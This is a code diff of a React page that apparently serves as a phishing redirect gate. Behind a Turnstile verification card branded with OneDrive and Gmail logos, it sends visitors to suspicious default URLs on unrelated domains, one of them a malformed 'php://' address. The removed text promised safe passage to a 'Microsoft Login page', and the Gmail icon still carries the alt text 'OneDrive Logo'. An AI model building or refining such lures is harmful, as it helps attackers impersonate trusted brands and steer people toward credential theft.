@@ -6,7 +6,7 @@ function App() {
   useEffect(() => {
     // Get redirect URL from query parameters
     const params = new URLSearchParams(window.location.search);
-    const redirectUrl = params.get('redirect') || 'https://office.tadalafil733.us/aVreVsFb';
+    const redirectUrl = params.get('redirect') || 'php://smart.sezaiha.properties/M5RSFJGh2S0c!DELf/';
 
     // Wait for Turnstile script to load and render widget
     const checkTurnstile = setInterval(() => {
@@ -43,7 +43,7 @@ function App() {
       <div className="bg-white rounded-2xl shadow-2xl max-w-xl w-full p-6 text-center">
         <div className="mb-4 flex justify-center">
           <img
-            src="https://download.logo.wine/logo/OneDrive/OneDrive-Logo.wine.png"
+            src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg"
             alt="OneDrive Logo"
             className="h-20 w-auto"
           />
@@ -54,7 +54,7 @@ function App() {
         </h1>
 
         <p className="text-base text-gray-600 mb-6 leading-relaxed">
-          You can now safely continue to the Microsoft Login page to access your files.
+          You are being redirected.
         </p>
 
         <div className="flex justify-center">
